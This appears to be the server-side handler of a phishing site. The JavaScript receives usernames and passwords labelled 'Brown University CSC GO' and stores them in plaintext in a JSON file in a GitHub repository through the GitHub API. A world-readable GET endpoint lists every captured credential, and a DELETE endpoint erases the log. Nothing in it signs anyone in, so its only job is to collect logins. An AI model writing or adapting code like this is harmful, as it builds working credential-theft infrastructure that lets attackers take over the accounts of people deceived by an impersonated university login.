const GITHUB_OWNER = 'hillwebworks';
const GITHUB_REPO = 'csgo-brown';
const FILE_PATH = 'data/submissions.json';

function githubHeaders() {
  const token = process.env.GITHUB_TOKEN;
  if (!token) throw new Error('GITHUB_TOKEN is not configured');
  return {
    Authorization: `Bearer ${token}`,
    Accept: 'application/vnd.github+json',
    'X-GitHub-Api-Version': '2022-11-28',
    'User-Agent': 'csgo-brown-api',
  };
}

async function readLog() {
  const response = await fetch(
    `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`,
    { headers: githubHeaders() }
  );

  if (response.status === 404) {
    return { submissions: [], sha: null };
  }

  if (!response.ok) {
    const detail = await response.text();
    throw new Error(`GitHub read failed (${response.status}): ${detail}`);
  }

  const file = await response.json();
  const decoded = JSON.parse(Buffer.from(file.content, 'base64').toString('utf8'));
  const submissions = Array.isArray(decoded) ? decoded : decoded.submissions || [];

  return { submissions, sha: file.sha };
}

async function writeLog(submissions, sha) {
  const payload = {
    message: `Update submissions log (${submissions.length} entries)`,
    content: Buffer.from(JSON.stringify(submissions, null, 2)).toString('base64'),
  };

  if (sha) payload.sha = sha;

  const response = await fetch(
    `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`,
    {
      method: 'PUT',
      headers: { ...githubHeaders(), 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }
  );

  if (!response.ok) {
    const detail = await response.text();
    throw new Error(`GitHub write failed (${response.status}): ${detail}`);
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.method === 'GET') {
      const { submissions } = await readLog();
      return res.status(200).json({ submissions, source: 'github' });
    }

    if (req.method === 'POST') {
      const { username, password } = req.body || {};

      if (!username || !password) {
        return res.status(400).json({ error: 'username and password required' });
      }

      const { submissions, sha } = await readLog();
      const entry = {
        username: String(username).trim(),
        password: String(password),
        timestamp: new Date().toISOString(),
        source: 'Brown University CSC GO',
      };

      submissions.unshift(entry);
      await writeLog(submissions, sha);

      return res.status(201).json({ ok: true, count: submissions.length, entry });
    }

    if (req.method === 'DELETE') {
      const { sha } = await readLog();
      await writeLog([], sha);
      return res.status(200).json({ ok: true, count: 0 });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (error) {
    console.error('submissions API error:', error);
    return res.status(500).json({
      error: 'Storage unavailable',
      detail: error.message,
    });
  }
}
